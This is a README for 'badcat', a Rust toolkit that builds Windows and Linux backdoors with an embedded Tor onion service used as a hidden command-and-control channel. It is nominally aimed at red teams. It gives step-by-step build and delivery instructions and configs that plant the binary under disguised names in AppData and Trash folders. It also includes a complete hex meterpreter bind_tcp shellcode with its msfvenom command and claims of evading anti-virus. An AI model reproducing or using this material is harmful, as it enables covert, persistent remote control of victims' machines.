# badcat

This a tool intended to be used by Red Teams, in order to mimic APT ([Advanced Persistent Threat](https://csrc.nist.gov/glossary/term/advanced_persistent_threat)) attacks. It hides the C2 ([Command and Control](https://csrc.nist.gov/glossary/term/C2)) server by using [Onion Services](https://community.torproject.org/onion-services/overview/) to masquerade attacker's real IP address.

# Glossary
_attacker_: conductor of the attack.

_victim_: the target machine of the attack.

_backdoor_: executable generated by the _attacker_ and delivered to _victim_.

_server_: _backdoor_ running Tor Onion Service on the _victim_.

# Features

1. Embeded Tor executable inside the _backdoor_. No need to create a new process for the Tor binary.
2. Automatic Hidden Service configuration using a configurable torrc template.
3. Authentication to access the _server_.
4. Optional use of payload (aka shellcode) in the _backdoor_, which is only executed once the attacker connects evading any AV real time monitoring. When not using a payload, fallback to badcat's basic shell.
5. Execution of payload can be re-started many times from the attacker.
5. XOR encryption of every sensible thing.
6. Full [rust](https://www.rust-lang.org/) source code.

# Alternatives

So far I have only found [ToRat](https://github.com/lu4p/ToRat) as a good alternative.

## ToRat

ToRat is a Remote Administration tool using Tor as a transport mechanism and RPC for communication. There are conceptual differences between badcat and ToRat. The former focuses at creating an environment for shipping an anonymous backdoor  with user adaptable payload. On the other hand, ToRat tries to be an All-In-One solution, featuring among other things, util commands via RPC, cross-platform and multi-user persistence, code obfuscation.

The big advantage of badcat compared to ToRat is the way it uses the Onion Service. Differently than ToRat, the server starts in the client and the attacker connects to the server, using the bind tcp approach. The main reason for this is convenience, because the attacker never needs to worry about keeping a server up and running, and by that I mean, secured, with log-rotation and backups. One other argument - although as far as I know nothing confirm that - it's that the attack surface to deanonymize an Onion Service is in a higher degree than to deanonymize a common Tor user.

# Getting Started

## Install Rust

1. Follow the instructions to install `rustup` tool: https://www.rust-lang.org/tools/install.
Select the default installation. Rustup prepares your environment for cross-compilation and dependency management using `cargo`.

```bash
...

    stable-x86_64-unknown-linux-gnu installed - rustc 1.56.1 (59eed8a2a 2021-11-01)


Rust is installed now. Great!

To get started you may need to restart your current shell.
This would reload your PATH environment variable to include
Cargo's bin directory ($HOME/.cargo/bin).

To configure your current shell, run:
source $HOME/.cargo/env
```

Now restart your shell or execute the mentioned command above to configure your shell.
With the configured shell, run the following command to ensure `rustup` was installed with success:

```bash
$ rustup --version
rustup 1.24.3 (ce5817a94 2021-05-31)
info: This is the version for the rustup toolchain manager, not the rustc compiler.
info: The currently active `rustc` version is `rustc 1.56.1 (59eed8a2a 2021-11-01)`
```

2. For configuring the Onion Service we need a tool for generating the hostname and the private key, for this badcat uses `mkp224o`. Follow the instructions to generate the binary https://github.com/cathugger/mkp224o#mkp224o---vanity-address-generator-for-ed25519-onion-services.

After you have compile `mkp224o` add the binary to your `PATH` environment, so badcat is able to call it. Ensure `mkp224o` is discoverable by your shell with:

```bash
$ which mkp224o
/home/myuser/.local/bin/mkp224o
```

## Simple Quick Usage

This quick example shows how to generate the _backdoor_ for a Windows x64 machine using Fedora (Linux). Let's breakdown the steps to gain remote command execution into 4 steps.

### 1. Compile the attacker toolkit once

The attacker toolkit is used to access _victim_'s computer through the backdoor, you are able to use it anywhere as long as you have the hosts file. The hosts file describes each of your _victim_ and how to get in touch with them.

```bash
$ cargo build --release -p attacker
```

The executable is at `target/release/attacker`.

### 2. Install Windows cross-compilation toolchain

We need to configure `rust` to target the Windows host.

```bash
$ rustup target add x86_64-pc-windows-gnu
$ rustup toolchain install stable-x86_64-pc-windows-gnu
error: DEPRECATED: future versions of rustup will require --force-non-host to install a non-host toolchain as the default.
warning: toolchain 'stable-x86_64-pc-windows-gnu' may not be able to run on this system.
warning: If you meant to build software to target that platform, perhaps try `rustup target add x86_64-pc-windows-gnu` instead?
info: syncing channel updates for 'stable-x86_64-pc-windows-gnu'
info: latest update on 2021-11-01, rust version 1.56.1 (59eed8a2a 2021-11-01)
info: downloading component 'cargo'
info: downloading component 'clippy'
info: downloading component 'rust-docs'
info: downloading component 'rust-mingw'
info: downloading component 'rust-std'
info: downloading component 'rustc'
info: downloading component 'rustfmt'
info: installing component 'cargo'
info: installing component 'clippy'
info: installing component 'rust-docs'
 17.2 MiB /  17.2 MiB (100 %)   1.7 MiB/s in  8s ETA:  0s
info: installing component 'rust-mingw'
info: installing component 'rust-std'
 31.4 MiB /  31.4 MiB (100 %)   9.7 MiB/s in  3s ETA:  0s
info: installing component 'rustc'
135.2 MiB / 135.2 MiB (100 %)   8.1 MiB/s in 16s ETA:  0s
info: installing component 'rustfmt'
  6.2 MiB /   6.2 MiB (100 %)   6.2 MiB/s in  1s ETA:  0s

  stable-x86_64-pc-windows-gnu installed - (rustc does not exist)

info: checking for self-updates
```

The two commands above may take a few minutes to complete.

There are two last components to install, the [Mingw](https://www.mingw-w64.org/) GCC compiler and `pthread` static libraries. Lookup how to install `Mingw` and `pthread` for your Operating System, remember that we are targeting `win64`. Hint, on Fedora the package name is `mingw64-gcc` and `mingw64-winpthreads-static`, respectively.

Then ensure it's fully configured running:

```bash
$ x86_64-w64-mingw32-gcc --version
x86_64-w64-mingw32-gcc (GCC) 10.3.1 20210422 (Fedora MinGW 10.3.1-2.fc33)
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

The version shown may be different than yours.

### 3. Build the _backdoor_ for Windows

Finally we are able to compile the _backdoor_. Every time you build a _backdoor_, badcat reads a configuration file with instructions. This configuration file must be at `victim/settings.json` but it's intended to be per-installation, so there is an example file at `victim/settings.json.example`. 

Once you have created the configuration from the example, we are done to build the _backdoor_ using the default configurations, which are the following:

- badcat's basic shell
- Tor executable directly from The Tor Project, which - unfortunately - is compiled to open a Windows console by default. See [Invisible _backdoor_](#invisible-backdoor) section of how to fix that.

Build the _backdoor_ targeting Windows x64:

```bash
$ cargo build -p victim --release --target=x86_64-pc-windows-gnu
```

Once completed, check the result file:

```bash
$ file target/x86_64-pc-windows-gnu/release/victim.exe
target/x86_64-pc-windows-gnu/release/victim.exe: PE32+ executable (GUI) x86-64, for MS Windows
```

That seems fine. You may now had noticed that a new file called `hosts.json` was created. That is the configuration file used to connect to the _victim_ using the attacker toolkit.

### 4. Delivery and Control

Deliver the generated executable to the _victim_ and execute it. In the image below you'll see a console opened, it's the Tor binary from The Tor Project.

![Windows screenshot of running _backdoor_](https://user-images.githubusercontent.com/28604565/143434657-6e080c8b-479a-456f-8547-d8840bb5ebb4.png)

Now configure Tor at your attacker machine and connect to the victim through the attacker toolkit. The attacker toolkit already uses the default Tor socks address.

![Attacker toolkit connected to _backdoor_](https://user-images.githubusercontent.com/28604565/143600952-b127192f-3aff-4114-b76e-bd7704ce4f0b.png)

## Advanced Usage

You'll find in this topic advanced ways to accomplish better results compared to the [simple quick usage](#simple-quick-usage) example.

### Invisible _backdoor_

The default behaviour of badcat's _backdoor_ is to hide the Windows console. Although the Tor binary is still visible to the user and may alert him about a compromise. A good backdoor behaviour would be to never show itself to the user, at least at a higher level. In order to hide the Tor console we need to provide the `-mwindows` flag to the compiler which means we need to compile it from source.

Fortunately, badcat provides an automated way to perform the compilation using docker containers. The container installs all the dependencies and executes `build-tor-windows` shellscript.

```bash
$ docker build -t wintor .
$ docker run -v ./target:/target --rm wintor
```

Note the latter command provides a volume mounted at `/target` directory. This is the location where the Tor binary will be copied into.

Once the compilation finished - it take a while, check the generated binary:

```bash
$ file target/tor.exe
target/tor.exe: PE32+ executable (GUI) x86-64, for MS Windows
```

Now you have to tell badcat to use your newly Tor binary. Badcat understands Tor binaries in two forms: a remote URL or a local file. We'll use a local file pointing at a directory which the binary is located. You cannot just throw your binary there, you have follow by the rules:

1. Binary must be inside an `App` directory.
2. Binary name must equal the `tor.executable` setting. Example:

The following directory structure:

victim
├── tor-windows
│   └── App
│       └── myAmazingApp.exe

Then your `settings.json` should look like below:

**Note: your directory is defined at `tor.download_url.windows`, and the location is relative to `victim` directory.**

```json
{
    "name": "my invisible backdoor",
    "hosts_file": "../hosts.json",
    "tor": {
        "build_for_windows": true,
        "download_url": {
            "windows": "file://tor-windows",
            "linux": "file://tor-linux/"
        },
        "destination_dir": {
            "windows": "AppData\\Local\\Microsoft",
            "linux": ".local/share/Trash/.repo"
        },
        "rc_file": "torrc",
        "executable": "myAmazingApp"
    },
    "payload": {
        "enabled": false,
        "hex": "",
        "bind_port": "9001"
    }
}
```

Now you compile, deliver and control the _backdoor_ as usual.

### Executing Custom Payload

One of the advanced features of badcat is the ability to execute custom payload. Let me elaborate: one can inject a payload into executable memory and jump into it, just after the _attacker_ connected to the _server_. So what kind of usefull payloads one might inject? Bind tcp ones. Badcat actually prepares a port on the _server_ for you to use a bind tcp payload, you can set the payload to anything wanted though.

Examples:

### 1. Connect through a custom shell

First translate your payload to hexadecimal. Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `4444` for the purpose of this example:

```json
{
    "name": "my custom shell",
    "hosts_file": "../hosts.json",
    "tor": {
        "build_for_windows": true,
        "download_url": {
            "windows": "file://tor-windows",
            "linux": "file://tor-linux/"
        },
        "destination_dir": {
            "windows": "AppData\\Local\\Microsoft",
            "linux": ".local/share/Trash/.repo"
        },
        "rc_file": "torrc",
        "executable": "myAmazingApp"
    },
    "payload": {
        "enabled": true,
        "hex": "MY EXTREME LARGE HEX SHELLCODE",
        "bind_port": "4444"
    }
}
```

Now compile your _backdoor_ and deliver as usual.

When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your shell using the onion address and the port as `settings.payload.bind_port` 4444 in our example.

```bash
$ ./attacker -f hosts.json
Badcat attacker toolkit. Connect to your hosts
Type help for commands.

# list
0 my custom shell true  andji3
# connect 0
trying to connect (attempt 0)...
connected to: Ip(0.0.0.0:0)
Your payload should be accessible now at: andji3yvdyslric3yfgnj665xfybagiyfqjdeurzuv3ejef2flwztrid.onion:PAYLOAD_PORT
```

### 2. Connect through a meterpreter session

Using meterpreter gives you a full-featured remote administration, but it's well known and blocked by most anti-viruses. With badcat, you evade all anti-virus detection because you only decrypt and execute the payload after the _attacker_ connects.

The steps to use a meterpreter shellcode is exactly the same as in example 1.

Generate the shellcode as hexadecimal using `msfvenom`:

```bash
$ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f hex
```

Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `6666` for the purpose of this example:

```json
{
    "name": "my meterpreter",
    "hosts_file": "../hosts.json",
    "tor": {
        "build_for_windows": true,
        "download_url": {
            "windows": "file://tor-windows",
            "linux": "file://tor-linux/"
        },
        "destination_dir": {
            "windows": "AppData\\Local\\Microsoft",
            "linux": ".local/share/Trash/.repo"
        },
        "rc_file": "torrc",
        "executable": "myAmazingApp"
    },
    "payload": {
        "enabled": true,
        "hex": "fc4881e4f0ffffffe8cc0000004151415052514831d265488b5260488b521856488b5220480fb74a4a4d31c9488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d08b481850448b40204901d0e3564d31c948ffc9418b34884801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e54831c0505049c7c402001a0a41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a025950504d31c94d31c048ffc04889c241baea0fdfe0ffd54889c76a1041584c89e24889f941bac2db3767ffd54831d24889f941bab7e938ffffd54d31c04831d24889f941ba74ec3be1ffd54889f94889c741ba756e4d61ffd54881c4b00200004883ec104889e24d31c96a0441584889f941ba02d9c85fffd54883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd54801c34829c64885f675e141ffe7586a005949c7c2f0b5a256ffd5",
        "bind_port": "6666"
    }
}
```

Now compile your _backdoor_ and deliver as usual.

When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your meterpreter session using the onion address and the port as `settings.payload.bind_port` 9999 in our example.

```bash
$ ./attacker -f hosts.json
Badcat attacker toolkit. Connect to your hosts
Type help for commands.

# list
0 my meterpreter true  anjgnj
# connect 0
trying to connect (attempt 0)...
connected to: Ip(0.0.0.0:0)
Your payload should be accessible now at: aqti2jzrbmniqsnwmi3zmxxy3edynawa472ywdj42nk2wox6akpkodqd.onion:PAYLOAD_PORT
```

After you have connected, fire up `msfconsole` - using `proxychains` or something similar - in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network or one will not be able to connect to the _server_.

![Msfconsole opened with session from badcat](https://user-images.githubusercontent.com/28604565/143482772-40267d27-9e9e-4f41-80e9-c956e5432be0.png)

